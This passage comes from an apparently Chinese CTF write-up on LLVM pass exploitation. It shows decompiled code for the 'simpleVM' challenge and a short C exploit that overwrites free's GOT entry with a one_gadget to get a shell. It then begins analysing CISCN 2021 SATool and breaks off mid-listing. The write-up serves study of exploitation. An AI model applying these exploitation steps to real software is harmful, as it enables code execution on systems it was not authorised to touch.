class="number">2</span>]; <span class="comment">// [rsp+1C0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v39[<span class="number">0</span>] = llvm::BasicBlock::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = llvm::BasicBlock::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::Instruction::<span class="built_in">getOpcode</span>(v36) == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v35 = (llvm::CallBase *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">      <span class="keyword">if</span> ( v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::<span class="built_in">getCalledFunction</span>(v35);</span><br><span class="line">        Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br><span class="line">        *(_QWORD *)s1 = *Name;</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOperand = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v32 = <span class="number">0LL</span>;</span><br><span class="line">            v31 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">            <span class="keyword">if</span> ( v31 )</span><br><span class="line">            &#123;</span><br><span class="line">              ZExtValue = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v31);</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">1</span> )</span><br><span class="line">                v32 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">2</span> )</span><br><span class="line">                v32 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v32 )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = off_20DFD8;</span><br><span class="line">              *v32 = *(_QWORD *)*off_20DFD8;</span><br><span class="line">              *v3 = (<span class="type">char</span> *)*v3 - <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;push&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v28 = <span class="number">0LL</span>;</span><br><span class="line">            v27 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v29);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              v26 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v27);</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">1</span> )</span><br><span class="line">                v28 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">2</span> )</span><br><span class="line">                v28 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v28 )</span><br><span class="line">            &#123;</span><br><span class="line">              v4 = off_20DFD8;</span><br><span class="line">              *off_20DFD8 = (<span class="type">char</span> *)*off_20DFD8 + <span class="number">8</span>;</span><br><span class="line">              *(_QWORD *)*v4 = *v28;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v24 = <span class="number">0LL</span>;</span><br><span class="line">            v23 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">            <span class="keyword">if</span> ( v23 )</span><br><span class="line">            &#123;</span><br><span class="line">              v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">                v24 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">                v24 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v24 == off_20DFD0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v20 = <span class="number">0LL</span>;</span><br><span class="line">            v19 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">            <span class="keyword">if</span> ( v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">                v20 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">                v20 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">              *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">              *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">            v16 = <span class="number">0LL</span>;</span><br><span class="line">            v15 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">            <span class="keyword">if</span> ( v15 )</span><br><span class="line">            &#123;</span><br><span class="line">              v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">                v16 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">                v16 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v16 )</span><br><span class="line">            &#123;</span><br><span class="line">              v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">              v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">              <span class="keyword">if</span> ( v12 )</span><br><span class="line">                *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">          v10 = <span class="number">0LL</span>;</span><br><span class="line">          v9 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v11);</span><br><span class="line">          <span class="keyword">if</span> ( v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">              v10 = off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">              v10 = off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">            v6 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v7);</span><br><span class="line">            <span class="keyword">if</span> ( v6 )</span><br><span class="line">              *v10 -= llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v6);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(s1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v39,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里我们终于可以知道为什么题目的名字叫<code>simpleVM</code>了，这就是很经典的<code>VMpwn</code>，只不过和<code>llvm pass</code>相结合而已。这个函数实现了<code>push</code>、<code>pop</code>、<code>store</code>、<code>load</code>、<code>add</code>指令功能。为了方便看懂代码，这里先简单分析几个<code>llvm pass</code>中的函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br></pre></td></tr></table></figure><p>获取函数的名字并赋值给<code>Name</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v8 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v9);</span><br></pre></td></tr></table></figure><p>获取函数的一个参数并将其赋值给<code>v8</code><br>这里我选择使用<code>add</code>、<code>store</code>、<code>load</code>相互配合来实现任意地址写，下面给出关键代码片段  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// store</span></span><br><span class="line"><span class="keyword">if</span> ( v23 )&#123;</span><br><span class="line">    v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">    v24 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">    v24 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v24 == off_20DFD0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )&#123;</span><br><span class="line">    **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// load</span></span><br><span class="line"><span class="keyword">if</span> ( v19 )&#123;</span><br><span class="line">    v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">    v20 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">    v20 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">    *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line"><span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">    *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          </span><br><span class="line"><span class="comment">// add</span></span><br><span class="line"><span class="keyword">if</span> ( v15 )&#123;</span><br><span class="line">    v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">    v16 = off_20DFD0;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">    v16 = off_20DFC0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v16 )&#123;</span><br><span class="line">    v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">    v12 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>学过<code>VMpwn</code>的师傅会发现，这里可以很容易的实现任意地址写<br>我们前面<code>checksec</code>发现<code>opt-8</code>并没有开启<code>PIE</code>保护以及<code>got</code>表可写。通过分析，在该关键函数每论循环结束时都会执行<code>free</code>函数，于是我们可以选择修改”寄存器”的值为<code>got</code>表地址，然后将里面的值读进”寄存器”，然后再利用<code>add</code>函数将”寄存器”里的<code>free</code>函数改成<code>onegadget</code>，最后写回<code>free</code>的<code>got</code>表中，程序调用<code>free</code>即可执行<code>onegadget</code>。最终的<code>exp</code>如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -emit-llvm -S exp.c -o exp.ll</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">store</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">load</span><span class="params">(<span class="type">int</span> a)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">o0o0o0o0</span><span class="params">()</span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);  </span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后执行<code>./opt-8 -load ./VMPass.so -VMPass ./exp.ll</code>即可<code>getshell</code><br>由于没有在比赛中遇到过这种题目，所以不知道远程是怎么打的。听别的师傅说，好像和<code>kernel pwn</code>和<code>qemu</code>逃逸一样，都是直接上传一个<code>elf</code>  </p><h3 id="CISCN-2021-SATool"><a href="#CISCN-2021-SATool" class="headerlink" title="[CISCN 2021] SATool"></a>[CISCN 2021] SATool</h3><p>首先还是按照上面的方法定位到被进行修改过的<code>runOnFunction</code>函数为<code>sub_19D0</code>，点开一看<code>500</code>多行代码，直接看的头大，这时候就十分的考验我们对关键代码的定位了<br>首先在最前面  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>((llvm::Value *)a2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">8</span> &amp;&amp; *Name == <span class="string">&#x27;r0oDkc4B&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = a2[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v4 != (llvm::Value *)(a2 + <span class="number">9</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="type">char</span> *)v4 - <span class="number">24</span>;</span><br><span class="line">        v82 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( !v4 )</span><br><span class="line">          v5 = <span class="number">0LL</span>;</span><br><span class="line">        v6 = *((_QWORD *)v5 + <span class="number">6</span>);</span><br><span class="line">        v7 = v5 + <span class="number">40</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">char</span> *)v6 != v7 )</span><br></pre></td></tr></table></figure><p>从中我们可以看到要一定要有名为<code>B4ckDo0r</code>（小端序）的函数才可以进行后面的操作<br>后面的程序大概可以看出，根据B4ckDo0r中调用不同的函数从而来执行相应的操作，接下来进行详细的分析<br>我们可以观察到如果传入的是<code>run</code>函数，他所执行的程序中存在以下这段代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">((<span class="built_in">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*byte_2040f8)(</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>,</span><br><span class="line">  <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure><p>这里会执行<code>*byte_2040f8</code>，所以我们想如果可以修改<code>byte_2040f8</code>为<code>one_gadget</code>的地址，执行该段代码时我们就可以<code>getshell</code>了<br>于是对<code>byte_2040f8</code>进行交叉引用，看看什么地方可以对该值进行修改，接下来对能对该地址进行修改的部分代码进行详细分析<br>首先是对<code>fakekey</code>函数的处理,定位到关键部分：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v76 = byte_204100;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br><span class="line">byte_204100 = v76 + SExtValue;</span><br><span class="line">*byte_2040f8 = v76 + SExtValue;</span><br></pre></td></tr></table></figure><p>可以看出该函数可以对<code>*byte_2040f8</code>和<code>byte_204100</code>的值加上一个用户自己定义的数，即<code>*byte_2040f8 = byte_204100 + 用户的value</code><br>接下来分析<code>stealkey</code>的关键部分：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_2040f8</span><br><span class="line">  &amp;&amp; !(<span class="number">-1431655765</span></span><br><span class="line">      * (<span class="type">unsigned</span> <span class="type">int</span>)((v15</span><br><span class="line">                      + <span class="number">24</span> * v65</span><br><span class="line">                      - <span class="number">24LL</span> * v66</span><br><span class="line">                      - (v8</span><br><span class="line">                      - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)(*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>))) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">&#123;</span><br><span class="line">  byte_204100 = *byte_2040f8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会将<code>*byte_2040f8</code>赋值给<code>byte_204100</code><br>最后是对<code>save</code>部分的分析，其有下面这段关键代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((v15 + <span class="number">24</span> * v18 - <span class="number">24</span> * (<span class="type">unsigned</span> __int64)NumTotalBundleOperands - v20) &gt;&gt; <span class="number">3</span>) == <span class="number">2</span> )&#123;</span><br><span class="line">  v21 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v21 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v21 != <span class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_143;</span><br><span class="line">    v22 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v23 = v15</span><br><span class="line">      + <span class="number">24</span> * v22</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v24 = (__int64 *)(v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v23 - (_QWORD)v24) &gt;&gt; <span class="number">3</span>)) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v25 = *v24;</span><br><span class="line">  v26 = *(_BYTE *)(v8 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v26 == <span class="number">79</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v26 != <span 